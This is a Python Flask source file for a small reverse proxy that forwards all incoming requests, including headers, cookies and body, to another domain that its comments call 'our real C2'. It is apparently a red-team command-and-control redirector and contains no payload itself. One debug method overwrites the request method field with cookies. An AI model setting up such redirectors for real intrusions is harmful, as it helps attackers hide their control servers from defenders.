from flask import Flask, jsonify, abort, request, make_response, url_for, Response
from functools import wraps
import os
import requests
import json


# STATIC VAR
__DEBUG = bool(os.environ.get('DEBUG', True))
__FORWARD_DOMAIN = str(os.environ.get('FORWARD_DOMAIN', 'google.com'))
__CURRENT_DOMAIN = str(os.environ.get('CURRENT_DOMAIN', 'killswitchgui.pythonanywhere.com'))

###############################
#         CUSTOM DEBUG        #
###############################

class debug_request():
    """
    debug printing of request object.
    """
    def __init__(self):
        # setup DB connection
        # TODO: add db support
        # self.conn = sql
        pass

    def log_request(self, request_obj):
        """
        used to log full request to db or other logging outlet
        """
        # TODO: build full logic for request
        req = self.build_json(request_obj)
        pass

    def print_request(self, request_obj):
        """
        print the entire request in json pprint
        """
        print self.build_json(request_obj)

    def build_json(self, request_obj):
        """
        build the json obj
        """
        json_dict = {}
        json_dict['url'] = request_obj.url
        json_dict['method'] = request_obj.method
        json_dict['headers'] = {key: value for (key, value) in request.headers if key != 'Host'}
        json_dict['method'] = request_obj.cookies
        json_dict['data'] = request_obj.data
        return json.dumps(json_dict, ensure_ascii=False, indent=4, sort_keys=True)


# SETUP FLASK APP FOR HOSTING
app = Flask(__name__)
debug_req = debug_request()

###############################
#      custom decorators      #
###############################

def proxy_required(func):
    """
    proxy http requests to forward domain (our real C2).
    """
    @wraps(func)
    def wrapper(*args, **kwargs):
        """
        wrapper function with decorator
        """
        try:
            if __DEBUG:
                debug_req.print_request(request)
                print request.url.replace(__CURRENT_DOMAIN, __FORWARD_DOMAIN)
            # setup our proxy for C2
            resp = requests.request(
                method=request.method,
                url=request.url.replace(__CURRENT_DOMAIN, __FORWARD_DOMAIN),
                headers={key: value for (key, value) in request.headers if key != 'Host'},
                data=request.get_data(),
                cookies=request.cookies,
                allow_redirects=True)
            excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
            headers = [(name, value) for (name, value) in resp.raw.headers.items()
                       if name.lower() not in excluded_headers]
            response = Response(resp.content, resp.status_code, headers)
            print "proxy response: %s" % (response)
            return response
        except:
            return make_response(jsonify({'error': 'somthing went wrong (contact admin)'}), 400)
    return wrapper

@app.before_request
@proxy_required
def log_request():
    """
    log request and force proxy
    """
    try:
        log_outlet = {'address' : request.remote_addr, 'url' : request.base_url}
        print log_outlet
    except:
        return make_response(jsonify({'error': 'somthing went wrong (contact admin)'}), 400)

@app.route('/<string:request_path>', methods=['GET'])
def request_forward(request_path):
    return "works/n"
